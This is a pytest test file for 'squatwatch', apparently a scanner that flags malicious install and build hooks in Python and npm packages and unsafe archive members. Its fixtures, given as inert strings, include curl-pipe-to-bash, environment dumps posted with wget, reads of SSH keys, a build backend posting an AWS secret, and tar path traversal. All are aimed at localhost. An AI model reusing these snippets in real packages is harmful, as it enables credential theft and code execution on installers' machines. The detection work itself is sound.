"""Build/install hook review: Python AST, JavaScript tokens, shell scripts, archives.

All "suspicious" snippets here are inert strings that are parsed, never executed.
"""

from __future__ import annotations

import io
import tarfile
import zipfile
from pathlib import Path

import pytest

from squatwatch.errors import ArchiveError
from squatwatch.hooks.common import Capability, finalise
from squatwatch.hooks.jsscan import review_js, tokenize
from squatwatch.hooks.pyast import review_python
from squatwatch.hooks.review import review_path, review_tree
from squatwatch.hooks.shell import review_script
from squatwatch.hooks.tree import ArchiveTree, DirectoryTree, is_archive
from squatwatch.models import Severity


def caps(hits: list) -> set[tuple[Capability, Severity, str]]:  # type: ignore[type-arg]
    return {(h.capability, h.severity, h.context) for h in hits}


# ------------------------------------------------------------------ python


def test_python_aliases_and_contexts() -> None:
    src = """
import subprocess as sp
from os import system
from urllib.request import urlopen as fetch
import os, socket
from setuptools.command.install import install

sp.run(["echo"])                      # module level: runs

class Hook(install):
    def run(self):
        helper()

def helper():
    fetch("http://127.0.0.1:9/")      # reachable from the install hook

def unused():
    system("true")                    # never called

def nested_parent():
    def inner():
        socket.socket()
    return inner
"""
    review = review_python(src, "setup.py")
    got = {(h.capability, h.context, h.evidence.get("call")) for h in review.hits}
    assert (Capability.PROCESS, "module", "subprocess.run") in got
    assert (Capability.NETWORK, "install-hook", "urllib.request.urlopen") in got
    assert (Capability.PROCESS, "unreferenced", "os.system") in got
    assert (Capability.NETWORK, "unreferenced", "socket.socket") in got
    assert review.hook_classes == ["Hook"]


def test_python_dynamic_code_and_obfuscation() -> None:
    src = """
import base64, codecs, zlib, importlib
exec(base64.b64decode("cHJpbnQoMSk="))
exec(open("pkg/version.py").read())
eval(user_value)
codecs.decode("uryyb", "rot13")
codecs.decode(b"x", "utf-8")
zlib.decompress(blob)
importlib.import_module(name)
__import__("os").system("true")
"""
    hits = review_python(src, "setup.py").hits
    sev = {(h.capability, h.severity) for h in hits}
    assert (Capability.OBFUSCATION, Severity.CRITICAL) in sev  # exec(b64decode(...))
    assert (Capability.DYNAMIC_CODE, Severity.LOW) in sev  # exec(open().read())
    assert (Capability.DYNAMIC_CODE, Severity.MEDIUM) in sev  # eval / import_module
    decode_calls = [h for h in hits if h.evidence.get("call") == "codecs.decode"]
    assert len(decode_calls) == 1  # utf-8 decoding is not obfuscation
    assert any(h.evidence.get("call") == "os.system" for h in hits)  # via __import__("os")


def test_python_environment_and_credentials() -> None:
    src = (
        """
import os, json
from os import environ
a = os.environ["HOME"]
b = os.environ.get("PYPI_TOKEN")
c = os.getenv("AWS_SECRET_ACCESS_KEY")
d = environ.get("CC")
e = os.environ[key]
f = os.getenv(name)
g = json.dumps(dict(os.environ))
for k, v in os.environ.items():
    pass
p = os.path.expanduser("~/.ssh/id_rsa")
"""
        + f'blob = "{"QUFB" * 100}"\n'
    )
    hits = review_python(src, "setup.py").hits
    secrets = [h for h in hits if h.secret]
    assert {h.evidence.get("variable") for h in secrets} >= {"PYPI_TOKEN", "AWS_SECRET_ACCESS_KEY"}
    assert any("whole environment" in h.detail for h in hits)
    assert any(h.capability is Capability.SENSITIVE_FILE for h in hits)
    assert any(
        h.capability is Capability.OBFUSCATION and "encoded-looking" in h.detail for h in hits
    )
    low = [h for h in hits if h.capability is Capability.ENV and h.severity is Severity.LOW]
    assert len(low) >= 4  # HOME, CC, computed key, computed name


def test_python_syntax_error_and_cmdclass() -> None:
    assert review_python("print 'py2'\n", "setup.py").syntax_error is not None
    review = review_python("from setuptools import setup\nsetup(cmdclass={'install': X})\n", "s.py")
    assert review.cmdclass == ["install"]


def test_finalise_downgrades_and_composes_exfiltration() -> None:
    src = """
import os, urllib.request
token = os.environ["NPM_TOKEN"]
urllib.request.urlopen("http://127.0.0.1:9/")
def later():
    os.system("x")
"""
    findings = finalise(review_python(src, "setup.py").hits, "setup.py", package="p")
    rules = {f.rule: f for f in findings}
    assert rules["SW309"].severity is Severity.CRITICAL
    assert rules["SW302"].severity is Severity.LOW  # MEDIUM lowered: unreferenced
    assert "not proven to run" in rules["SW302"].message
    assert all(f.package == "p" for f in findings)


# -------------------------------------------------------------- javascript


def test_tokenizer_skips_comments_and_handles_regex() -> None:
    toks = tokenize(
        '// require("child_process")\n/* eval( */ const r = /a\\/b[/]c/g; x = a / b; s = `t`'
    )
    texts = [t.text for t in toks]
    assert "child_process" not in texts and "eval" not in texts
    assert any(t.kind == "regex" for t in toks)
    assert texts.count("/") == 1  # the division
    assert tokenize("'unterminated")[0].kind == "string"


def test_js_patterns() -> None:
    src = """
const cp = require("child_process");
import https from "https";
const net = await import("net");
cp.exec("echo");
fetch("https://127.0.0.1:9/");
const t = process.env.GITHUB_TOKEN, h = process.env["HOME"], all = process.env;
eval(Buffer.from("cHJpbnQ=", "base64").toString());
new Function("return 1")();
vm.runInNewContext("1");
const d = atob("eA==");
const p = "/home/u/.npmrc";
"""
    hits = review_js(src)
    details = " | ".join(h.detail for h in hits)
    assert "loads child_process" in details
    assert "loads network module https" in details and "loads network module net" in details
    assert "runs a process via exec()" in details
    assert "calls fetch()" in details
    assert "'GITHUB_TOKEN'" in details and "'HOME'" in details and "whole process.env" in details
    assert any(h.severity is Severity.CRITICAL for h in hits)  # eval(decoded)
    assert "calls Function()" in details and "vm.runInNewContext" in details
    assert "decodes embedded data" in details
    assert any(h.capability is Capability.SENSITIVE_FILE for h in hits)


def test_js_exec_without_child_process_is_ignored() -> None:
    assert review_js('regex.exec("x"); obj.spawn();') == []


# ------------------------------------------------------------------- shell


def test_shell_download_and_execute() -> None:
    hits = review_script("preinstall", "curl -fsSL http://127.0.0.1:9/x.sh | bash")
    assert any(h.rule == "SW310" and h.severity is Severity.CRITICAL for h in hits)


def test_shell_other_patterns() -> None:
    hits = review_script(
        "postinstall",
        "echo $NPM_TOKEN && env | wget --post-data=- http://127.0.0.1:9/ ; "
        'echo eA== | base64 -d | sh; node -e "require(\'child_process\')"; eval "$X"; '
        'cat ~/.ssh/id_rsa; sudo FOO=1 python -c "print(1)"',
    )
    details = " | ".join(h.detail for h in hits)
    assert "$NPM_TOKEN" in details
    assert "dumps the environment with env" in details
    assert "runs network client wget" in details
    assert any(h.severity is Severity.CRITICAL and "decoded" in h.detail for h in hits)
    assert "runs inline node code" in details and "loads child_process" in details
    assert "runs inline python code" in details
    assert "uses shell eval" in details
    assert "credential path" in details


def test_shell_node_file_is_reviewed_and_bad_quotes_tolerated() -> None:
    files = {"scripts/x.js": 'require("https")'}

    def read(path: str) -> str | None:
        return files.get(path.removeprefix("./"))

    hits = review_script("install", "node --trace-warnings ./scripts/x", read_file=read)
    assert [(h.path, h.capability) for h in hits] == [("./scripts/x", Capability.NETWORK)]
    assert review_script("install", "node missing.js", read_file=read) == []
    assert review_script("install", "echo 'unbalanced") == []


# ------------------------------------------------------------------ archives


def make_tar(
    path: Path, members: dict[str, bytes], *, extra: list[tarfile.TarInfo] | None = None
) -> Path:
    with tarfile.open(path, "w:gz") as tar:
        for name, data in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
        for info in extra or []:
            tar.addfile(info)
    return path


def test_archive_tree_strips_prefix_and_reports_unsafe(tmp_path: Path) -> None:
    link = tarfile.TarInfo("pkg-1.0/link")
    link.type = tarfile.SYMTYPE
    link.linkname = "/etc/passwd"
    dev = tarfile.TarInfo("pkg-1.0/dev")
    dev.type = tarfile.CHRTYPE
    path = make_tar(
        tmp_path / "pkg-1.0.tar.gz",
        {"pkg-1.0/setup.py": b"x = 1\n", "pkg-1.0/../evil": b"", "/abs": b""},
        extra=[link, dev],
    )
    tree = ArchiveTree(path)
    assert tree.root_files() == ["setup.py"] or "setup.py" in tree.root_files()
    assert tree.read_text("setup.py") == "x = 1\n"
    assert tree.read_text("../setup.py") is None
    assert tree.read_text("missing") is None
    rules = [f.message for f in tree.issues]
    assert len(rules) == 4


def test_archive_limits(tmp_path: Path) -> None:
    path = make_tar(tmp_path / "big.tar.gz", {f"p/f{i}.txt": b"x" * 100 for i in range(5)})
    tree = ArchiveTree(path, max_members=3, max_file_bytes=50)
    assert any("member limit" in f.message for f in tree.issues)
    assert tree.read_text("f0.txt") is None  # over per-file limit


def test_zip_and_bad_archives(tmp_path: Path) -> None:
    zpath = tmp_path / "x-1.0-py3-none-any.whl"
    with zipfile.ZipFile(zpath, "w") as zf:
        zf.writestr("x.pth", "import os\n")
        zf.writestr("x/", "")
        link = zipfile.ZipInfo("x/link")
        link.external_attr = 0o120777 << 16
        zf.writestr(link, "target")
    tree = ArchiveTree(zpath)
    assert "x.pth" in tree.root_files()
    assert any("symbolic link" in f.message for f in tree.issues)
    bad = tmp_path / "bad.tar.gz"
    bad.write_bytes(b"not an archive")
    with pytest.raises(ArchiveError):
        ArchiveTree(bad)
    assert review_path(bad).errors
    assert is_archive(zpath) and not is_archive(tmp_path)


def test_directory_tree_is_confined(tmp_path: Path) -> None:
    (tmp_path / "pkg").mkdir()
    (tmp_path / "pkg" / "setup.py").write_text("x=1")
    (tmp_path / "secret.txt").write_text("nope")
    (tmp_path / "pkg" / "big.py").write_text("x" * 100)
    tree = DirectoryTree(tmp_path / "pkg", max_file_bytes=50)
    assert tree.read_text("setup.py") == "x=1"
    assert tree.read_text("../secret.txt") is None
    assert tree.read_text("big.py") is None
    assert tree.read_text("") is None
    assert tree.root_files() == ["big.py", "setup.py"]
    assert DirectoryTree(tmp_path / "missing").root_files() == []


# ----------------------------------------------------------- full review


def test_review_tree_python_package(tmp_path: Path) -> None:
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "setup.py").write_text(
        "from setuptools import setup\nimport os\nos.system('true')\n"
        "setup(name='demo', install_requires=['reqeusts'], cmdclass={'install': X})\n"
    )
    (pkg / "pyproject.toml").write_text('[build-system]\nbuild-backend = "weird.backend"\n')
    (pkg / "demo.pth").write_text("# comment\nimport os; os.system('true')\n")
    result = review_tree(DirectoryTree(pkg))
    rules = sorted({f.rule for f in result.findings})
    assert rules == ["SW302", "SW307", "SW308", "SW312"]
    assert [d.name for d in result.dependencies] == ["reqeusts"]


def test_review_py2_setup_and_missing_backend_module(tmp_path: Path) -> None:
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "setup.py").write_text("print 'hello'\n")
    (pkg / "pyproject.toml").write_text(
        '[build-system]\nbuild-backend = "missing_mod"\nbackend-path = ["."]\n'
    )
    result = review_path(pkg)
    assert {f.rule for f in result.findings} == {"SW300", "SW308"}
    assert review_path(tmp_path / "nope.txt").errors


def test_review_npm_package_without_hooks(tmp_path: Path) -> None:
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "package.json").write_text('{"name": "x", "scripts": {"test": "jest"}}')
    result = review_tree(DirectoryTree(pkg), third_party=False)
    assert result.findings == []


def test_in_tree_backend_pep517_hooks_are_entry_points(tmp_path: Path) -> None:
    """The build frontend calls PEP 517/660 hooks by contract, so code inside them
    (and helpers they call, or functions bound to a hook name) runs at build time."""
    pkg = tmp_path / "pkg"
    (pkg / "_build").mkdir(parents=True)
    (pkg / "pyproject.toml").write_text(
        '[project]\nname = "demo"\n[build-system]\nrequires = []\n'
        'build-backend = "backend"\nbackend-path = ["_build"]\n'
    )
    (pkg / "_build" / "backend.py").write_text(
        "import os, urllib.request\n"
        "def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):\n"
        "    key = os.environ['AWS_SECRET_ACCESS_KEY']\n"
        "    urllib.request.urlopen('http://127.0.0.1:9/', data=key.encode())\n"
        "    return 'demo-0-py3-none-any.whl'\n"
        "def _sdist_impl(sdist_directory, config_settings=None):\n"
        "    _ship()\n"
        "def _ship():\n"
        "    os.system('true')\n"
        "build_sdist = _sdist_impl\n"
        "def unrelated():\n"
        "    os.popen('true')\n"
    )
    result = review_path(pkg)
    by_rule = {(f.rule, f.severity) for f in result.findings}
    assert ("SW309", Severity.CRITICAL) in by_rule
    assert ("SW301", Severity.HIGH) in by_rule
    contexts = {f.evidence.get("call"): f.evidence.get("context") for f in result.findings}
    assert contexts["urllib.request.urlopen"] == "build-backend"
    assert contexts["os.system"] == "build-backend"  # via build_sdist = _sdist_impl -> _ship
    assert contexts["os.popen"] == "unreferenced"
    assert not any("not proven to run" in f.message for f in result.findings if f.rule == "SW301")
